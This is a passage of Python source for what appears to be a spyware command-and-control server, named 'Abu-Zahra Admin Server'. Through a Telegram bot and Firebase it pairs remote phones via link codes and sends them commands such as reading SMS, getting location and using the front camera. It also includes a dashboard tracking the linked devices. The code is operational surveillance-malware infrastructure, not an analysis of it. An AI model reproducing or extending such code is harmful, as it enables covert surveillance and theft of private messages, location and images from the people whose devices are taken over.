        f"┌─────────┐\n"
        f"│  <code>{code}</code>  │\n"
        f"└─────────┘\n\n"
        f"⏰ صالح لمدة 10 دقائق\n"
        f"📱 أدخل هذا الرمز في تطبيق الجهاز للربط"
    )

def handle_select(bot, message):
    chat_id = message['chat']['id']
    if chat_id != ADMIN_CHAT_ID:
        return

    if not devices:
        bot.send_message(chat_id, "📭 لا توجد أجهزة متصلة. استخدم /link لربط جهاز.")
        return

    # Build inline keyboard
    keyboard = []
    row = []
    idx = 0
    for did, info in devices.items():
        status = "🟢" if info.get('status') == 'online' else "🔴"
        name = info.get('name', 'Unknown')[:12]
        row.append({"text": f"{status} {name}", "callback_data": f"sel_{did}"})
        idx += 1
        if idx % 2 == 0:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    reply_markup = {"inline_keyboard": keyboard}
    bot.send_message(chat_id, "📱 اختر جهاز للتحكم:", reply_markup=reply_markup)

def handle_commands(bot, message):
    chat_id = message['chat']['id']
    if chat_id != ADMIN_CHAT_ID:
        return

    user_session = user_sessions.get(chat_id, {})
    device_id = user_session.get('device_id')

    prefix = ""
    if not device_id:
        prefix = "⚠️ لم تختر جهاز بعد!\n\n"

    text = f"{prefix}📋 <b>قائمة الأوامر ({len(COMMAND_REGISTRY)} أمر):</b>\n\n"

    for category, commands in COMMAND_CATEGORIES.items():
        text += f"<b>{category}</b>\n"
        for cmd, info in commands.items():
            args = info.get('args', '')
            if args:
                text += f"  /{cmd} <code>{args}</code> - {info['desc']}\n"
            else:
                text += f"  /{cmd} - {info['desc']}\n"
        text += "\n"

    # Truncate if needed
    if len(text) > 4000:
        text = text[:3900] + "\n\n... المزيد في القسم التالي"

    bot.send_message(chat_id, text, disable_web_page_preview=False)

def handle_status(bot, message):
    chat_id = message['chat']['id']
    if chat_id != ADMIN_CHAT_ID:
        return

    online = sum(1 for d in devices.values() if d.get('status') == 'online')
    total_cmds = sum(len(v) for v in command_results.values())

    text = (
        f"📊 <b>حالة النظام</b>\n\n"
        f"🤖 البوت: {'🟢 يعمل' if bot and bot.me else '🔴 متوقف'}\n"
        f"📱 الأجهزة: {len(devices)} ({online} متصل)\n"
        f"🔥 Firebase: {'🟢 متصل' if FB_ENABLED else '🔴 متوقف'}\n"
        f"📡 أوامر اليوم: {total_cmds}\n"
        f"🔗 رموز الربط النشطة: {sum(1 for c in link_codes.values() if not c['used'])}\n"
        f"📋 الإصدار: v3.4.0\n"
        f"🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    bot.send_message(chat_id, text)

def handle_dashboard(bot, message):
    chat_id = message['chat']['id']
    if chat_id != ADMIN_CHAT_ID:
        return

    # Generate web dashboard URL
    text = (
        f"🖥 <b>لوحة التحكم</b>\n\n"
        f"🔗 Web Dashboard: <code>https://alsydyabwalzhra.online:{SERVER_PORT}/dashboard</code>\n\n"
        f"📊 <b>ملخص سريع:</b>\n"
        f"  الأجهزة: {len(devices)}\n"
        f"  المتصلة: {sum(1 for d in devices.values() if d.get('status') == 'online')}\n"
        f"  Firebase: {'✅' if FB_ENABLED else '❌'}\n"
    )
    bot.send_message(chat_id, text)

# ============================================================
# DIRECT COMMAND HANDLING
# ============================================================
def handle_direct_command(bot, message, command, args=""):
    chat_id = message['chat']['id']

    # Check admin
    if chat_id != ADMIN_CHAT_ID:
        return

    user_session = user_sessions.get(chat_id, {})
    device_id = user_session.get('device_id')

    if not device_id or device_id not in devices:
        bot.send_message(chat_id, "⚠️ لم تختر جهاز. استخدم /select أولاً.")
        return

    device = devices[device_id]
    if device.get('status') != 'online':
        bot.send_message(chat_id, f"⚠️ الجهاز ({device.get('name', '?')}) غير متصل حالياً.\nسيتم إرسال الأمر وسيُنفذ عند الاتصال.")

    # Check command exists
    if command not in COMMAND_REGISTRY:
        bot.send_message(chat_id, f"❌ أمر غير معروف: <code>{command}</code>\nاستخدم /commands لعرض الأوامر.")
        return

    # Send waiting message
    cmd_info = COMMAND_REGISTRY[command]
    waiting_msg = bot.send_message(chat_id,
        f"⏳ <b>جاري التنفيذ...</b>\n\n"
        f"📱 الجهاز: {device.get('name', '?')}\n"
        f"🔧 الأمر: /{command}\n"
        f"📝 الوصف: {cmd_info.get('desc', '')}"
    )

    # Get message_id for editing
    msg_id = waiting_msg.get('message_id') if waiting_msg else None

    # Send command to device
    cmd_id = send_command_to_device(
        device_id, command, args,
        chat_id=chat_id,
        message_id=msg_id
    )

    # Set timeout for response
    def check_timeout():
        time.sleep(60)
        if cmd_id in result_callbacks:
            # No response received
            del result_callbacks[cmd_id]
            try:
                bot.edit_message_text(chat_id, msg_id,
                    f"⏰ <b>انتهت مهلة الأمر</b>\n\n"
                    f"📱 الجهاز: {device.get('name', '?')}\n"
                    f"🔧 الأمر: /{command}\n\n"
                    f"⚠️ لم يستجب الجهاز. تأكد من:\n"
                    f"• التطبيق يعمل على الجهاز\n"
                    f"• الاتصال بالإنترنت متوفر\n"
                    f"• Firebase يعمل بشكل صحيح"
                )
            except Exception:
                pass

    threading.Thread(target=check_timeout, daemon=True).start()

# ============================================================
# CALLBACK QUERY HANDLER
# ============================================================
def handle_callback_query(bot, callback_query):
    chat_id = callback_query['message']['chat']['id']
    data = callback_query.get('data', '')

    if chat_id != ADMIN_CHAT_ID:
        bot.answer_callback_query(callback_query['id'], "غير مصرح")
        return

    if data.startswith('sel_'):
        device_id = data[4:]
        if device_id in devices:
            device = devices[device_id]
            user_sessions[chat_id] = {
                'device_id': device_id,
                'state': 'active',
                'last_active': time.time()
            }
            name = device.get('name', 'Unknown')
            status = "🟢 متصل" if device.get('status') == 'online' else "🔴 غير متصل"
            bot.answer_callback_query(callback_query['id'], f"تم اختيار: {name}")
            bot.send_message(chat_id,
                f"✅ <b>تم اختيار الجهاز:</b>\n\n"
                f"📱 {name}\n"
                f"🔗 {status}\n"
                f"📦 {device.get('model', '?')}\n\n"
                f"الآن يمكنك إرسال الأوامر مباشرة:\n"
                f"<code>sms</code> | <code>location</code> | <code>camera_front</code> | <code>info</code>\n"
                f"أو استخدم /commands لعرض كل الأوامر"
            )
        else:
            bot.answer_callback_query(callback_query['id'], "الجهاز غير موجود")

# ============================================================
# MESSAGE PROCESSOR
# ============================================================
def process_message(bot, message):
    """Main message processing function"""
    if not message or 'text' not in message:
        return

    text = message['text'].strip()
    chat_id = message['chat']['id']

    # Handle bot commands (/xxx)
    if text.startswith('/'):
        parts = text.split(' ', 1)
        cmd = parts[0].lower()
        args = parts[1].strip() if len(parts) > 1 else ""

        # Remove @botname suffix
        if '@' in cmd:
            cmd = cmd.split('@')[0]

        cmd_name = cmd[1:]  # Remove /

        # Built-in commands
        builtins = {
            'start': handle_start,
            'help': handle_commands,
            'devices': handle_devices,
            'link': handle_link,
            'select': handle_select,
            'commands': handle_commands,
            'status': handle_status,
            'dashboard': handle_dashboard,
        }

        if cmd_name in builtins:
            builtins[cmd_name](bot, message)
        elif cmd_name in COMMAND_REGISTRY:
            handle_direct_command(bot, message, cmd_name, args)
        else:
            bot.send_message(chat_id, f"❌ أمر غير معروف: <code>{cmd_name}</code>\n\nاستخدم /commands لعرض الأوامر المتاحة.")
    else:
        # Plain text command (without /)
        parts = text.split(' ', 1)
        cmd = parts[0].lower().strip()
        args = parts[1].strip() if len(parts) > 1 else ""

        if cmd in COMMAND_REGISTRY:
            handle_direct_command(bot, message, cmd, args)
        else:
            # Not a recognized command, ignore
            pass

# ============================================================
# TELEGRAM POLLING LOOP
# ============================================================
def start_telegram_polling():
    global bot

    if not bot or not bot.me:
        logger.error("Cannot start polling - bot not initialized")
        return

    logger.info("Starting Telegram polling...")
    bot.offset = 0

    while True:
        try:
            updates = bot.get_updates(offset=bot.offset, timeout=30)
            if updates:
                for update in updates:
                    # Update offset
                    bot.offset = update['update_id'] + 1

                    # Process message
                    if 'message' in update:
                        process_message(bot, update['message'])

                    # Process callback query
                    if 'callback_query' in update:
                        handle_callback_query(bot, update['callback_query'])
        except KeyboardInterrupt:
            logger.info("Polling stopped by user")
            break
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)

# ============================================================
# FIREBASE RESULT LISTENER
# ============================================================
def start_firebase_listener():
    """Listen for command results from devices via Firebase"""
    if not FB_ENABLED:
        return

    logger.info("Starting Firebase result listener...")

    def listen_loop():
        while True:
            try:
                results = fb_get("results")
                if results:
                    for device_id, cmds in results.items():
                        if isinstance(cmds, dict):
                            for cmd_id, result_data in cmds.items():
                                if cmd_id in result_callbacks:
                                    callback = result_callbacks.pop(cmd_id)
                                    if bot and bot.me:
                                        send_command_result(
                                            callback['chat_id'],
                                            result_data.get('command', ''),
                                            result_data.get('status', ''),
                                            result_data.get('result', ''),
                                            callback.get('message_id')
                                        )
                                    # Clean up Firebase
                                    fb_remove(f"results/{device_id}/{cmd_id}")
                                else:
                                    # Auto-cleanup old results
                                    fb_remove(f"results/{device_id}/{cmd_id}")
            except Exception as e:
                logger.error(f"Firebase listener error: {e}")
            time.sleep(3)

    threading.Thread(target=listen_loop, daemon=True).start()

# ============================================================
# WEB DASHBOARD
# ============================================================
DASHBOARD_HTML = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Abu-Zahra Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a1a; color: #e0e0e0; min-height: 100vh; }
        .header { background: linear-gradient(135deg, #1a1a3e, #2d1b4e); padding: 20px; text-align: center; border-bottom: 2px solid #6c3baa; }
        .header h1 { color: #a78bfa; font-size: 24px; }
        .header .version { color: #888; font-size: 12px; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: #1a1a2e; border: 1px solid #333; border-radius: 10px; padding: 20px; text-align: center; }
        .stat-card .number { font-size: 32px; font-weight: bold; color: #a78bfa; }
        .stat-card .label { color: #888; font-size: 14px; margin-top: 5px; }
        .devices { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
        .device-card { background: #1a1a2e; border: 1px solid #333; border-radius: 10px; padding: 15px; transition: 0.3s; }
        .device-card:hover { border-color: #6c3baa; }
        .device-card .name { font-size: 18px; font-weight: bold; color: #a78bfa; }
        .device-card .info { color: #888; font-size: 13px; margin-top: 8px; }
        .device-card .status { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 12px; margin-top: 8px; }
        .status.online { background: #064e3b; color: #6ee7b7; }
        .status.offline { background: #450a0a; color: #fca5a5; }
        .footer { text-align: center; padding: 20px; color: #555; font-size: 12px; }
        .refresh { background: #6c3baa; color: white; border: none; padding: 8px 20px; border-radius: 5px; cursor: pointer; margin: 10px; }
        .refresh:hover { background: #7c4bcc; }
    </style>
</head>
<body>
    <div class="header">
        <h1>&#x1F916; Abu-Zahra Dashboard</h1>
        <div class="version">v3.4.0 | Server Status: Online</div>
    </div>
    <div class="container">
        <div class="stats">
            <div class="stat-card">
                <div class="number" id="total-devices">{{ total_devices }}</div>
                <div class="label">Total Devices</div>
            </div>
            <div class="stat-card">
                <div class="number" id="online-devices">{{ online_devices }}</div>
                <div class="label">Online Devices</div>
            </div>
            <div class="stat-card">
                <div class="number">{{ total_commands }}</div>
                <div class="label">Commands Registry</div>
            </div>
            <div class="stat-card">
                <div class="number" id="firebase-status">{{ firebase_status }}</div>
                <div class="label">Firebase</div>
            </div>
        </div>
        <button class="refresh" onclick="location.reload()">&#x1F504; Refresh</button>
        <h2 style="margin: 20px 0; color: #a78bfa;">&#x1F4F1; Connected Devices</h2>
        <div class="devices">
            {% for device in device_list %}
            <div class="device-card">
                <div class="name">{{ device.name }}</div>
                <div class="info">
                    &#x1F4F1; {{ device.model }}<br>
                    &#x1F4BB; {{ device.os_version }}<br>
                    &#x1F50B; {{ device.battery }}%<br>
                    &#x1F552; {{ device.last_seen }}
                </div>
                <span class="status {{ device.status_class }}">{{ device.status_text }}</span>
            </div>
            {% endfor %}
            {% if not device_list %}
            <p style="color: #888; text-align: center; grid-column: 1/-1;">No devices connected</p>
            {% endif %}
        </div>
    </div>
    <div class="footer">
        Abu-Zahra Admin Server v3.4.0 &copy; {{ year }}
    </div>
</body>
</html>
"""

@app.route('/dashboard')
def dashboard():
    device_list = []
    for did, info in devices.items():
        is_online = info.get('status') == 'online'
        last_seen = "Never"
        if info.get('last_seen'):
            last_seen = datetime.fromtimestamp(info['last_seen']).strftime('%Y-%m-%d %H:%M:%S')

        device_list.append({
            'name': info.get('name', 'Unknown'),
            'model': info.get('model', '?'),
            'os_version': info.get('os_version', '?'),
            'battery': info.get('battery', 0),
            'status_text': 'Online' if is_online else 'Offline',
            'status_class': 'online' if is_online else 'offline',
            'last_seen': last_seen
        })

    return render_template_string(
        DASHBOARD_HTML,
        total_devices=len(devices),
        online_devices=sum(1 for d in devices.values() if d.get('status') == 'online'),
        total_commands=len(COMMAND_REGISTRY),
        firebase_status="Connected" if FB_ENABLED else "Disconnected",
        device_list=device_list,
        year=datetime.now().year
    )

# ============================================================
# LOAD EXISTING DEVICES FROM FIREBASE
# ============================================================
def load_existing_devices():
    try:
        fb_devices = fb_get("devices")
        if fb_devices and isinstance(fb_devices, dict):
            for did, dinfo in fb_devices.items():
                if dinfo:
                    devices[did] = dinfo
            logger.info(f"Loaded {len(devices)} devices from Firebase")
    except Exception as e:
        logger.error(f"Load devices error: {e}")

# ============================================================
# INITIALIZATION
# ============================================================
bot = TelegramBot(BOT_TOKEN)

# Load existing data
load_existing_devices()

# Start Firebase listener
start_firebase_listener()

# Start Telegram polling in background
polling_thread = threading.Thread(target=start_telegram_polling, daemon=True)
polling_thread.start()

logger.info(f"Server starting on {SERVER_HOST}:{SERVER_PORT}")
logger.info(f"Bot: @{bot.me['username'] if bot.me else 'N/A'}")
logger.info(f"Admin Chat ID: {ADMIN_CHAT_ID}")
logger.info(f"Firebase: {'Connected' if FB_ENABLED else 'Disconnected'}")
logger.info(f"Commands: {len(COMMAND_REGISTRY)} registered")

# ============================================================
# START FLASK (SSL)
# ============================================================
if __name__ == '__main__':
    import ssl

    ssl_context = None
    cert_path = os.environ.get('SSL_CERT', 'cert.pem')
    key_path = os.environ.get('SSL_KEY', 'key.pem')

    if os.path.exists(cert_path) and os.path.exists(key_path):
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(cert_path, key_path)
        logger.info("SSL enabled")
    else:
        logger.warning("SSL certificates not found. Running without SSL.")

    app.run(
        host=SERVER_HOST,
        port=SERVER_PORT,
        ssl_context=ssl_context,
        threaded=True,
        use_reloader=False
    )
